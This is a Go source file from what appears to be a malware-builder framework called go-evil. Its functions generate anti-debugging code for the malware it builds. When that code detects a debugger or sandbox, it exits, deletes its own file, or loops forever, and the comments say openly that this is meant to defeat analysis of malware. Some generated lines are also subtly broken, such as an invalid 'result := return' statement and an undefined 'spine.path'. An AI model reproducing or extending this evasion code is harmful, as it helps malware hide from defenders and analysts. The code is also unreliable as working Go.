package parsing

import (
	"github.com/TeamPhoneix/go-evil/utility/structure"
)

//
//
// Adds the responsible code used for detecting if the malware is launched
// under a debugger
//
//
func identify_debugger(s_json string) string {
	data_object := structure.Receive(s_json)
	body := []string{"func detect_debugger() bool {", "result := return coldfire.SandboxAll()", "}"}

	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
	data_object.Add_go_function(body)

	return structure.Send(data_object)
}

//
//
// Generate the debugger detection function
//
//
func stop_behavior(s_json string) string {
	data_object := structure.Receive(s_json)
	body := []string{"func stop_behavior() bool {",
		"toReturn := false",
		"toReturn = detect_debugger()",
		"if toReturn {",
		"os.Exit(42)",
		"}"}

	body = append(body, "return toReturn", "}")
	data_object.Add_go_function(body)
	data_object.Add_go_import("os")

	return structure.Send(data_object)
}

//
//
// Generates the code which will remove the malware
// after it has been launched in a debugger
//
//
func remove_behavior(s_json string) string {
	data_object := structure.Receive(s_json)
	body := []string{"func remove_behavior() bool {",
		"toReturn := false",
		"toReturn = detect_debugger()",
		"if toReturn {",
		"os.Remove(spine.path)",
		"os.Exit(42)",
		"}"}

	body = append(body, "return toReturn", "}")
	data_object.Add_go_function(body)
	data_object.Add_go_import("os")
	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")

	return structure.Send(data_object)
}

//
//
// Generates the code which will cause the malware to enter an infinite loop
//
//
func loop_behavior(s_json string) string {
	data_object := structure.Receive(s_json)
	body := []string{"func loop_behavior() bool {",
		"toReturn := false",
		"toReturn = detect_debugger()",
		"if toReturn {",
		"for {",
		"}}"}

	body = append(body, "return toReturn", "}")
	data_object.Add_go_function(body)

	return structure.Send(data_object)
}

//
//
// Generate behavior function for debugging
//
//
func generate_behavior_debugging(s_json string) string {
	data_object := structure.Receive(s_json)

	if data_object.Debugger_behavior != "none" {
		s_json = identify_debugger(s_json) // Adds neccessary code to identify a debugger

		switch data_object.Debugger_behavior {
		case "stop":
			s_json = stop_behavior(s_json)
		case "remove":
			s_json = remove_behavior(s_json)
		case "loop":
			s_json = loop_behavior(s_json)
		}
	}

	return s_json
}
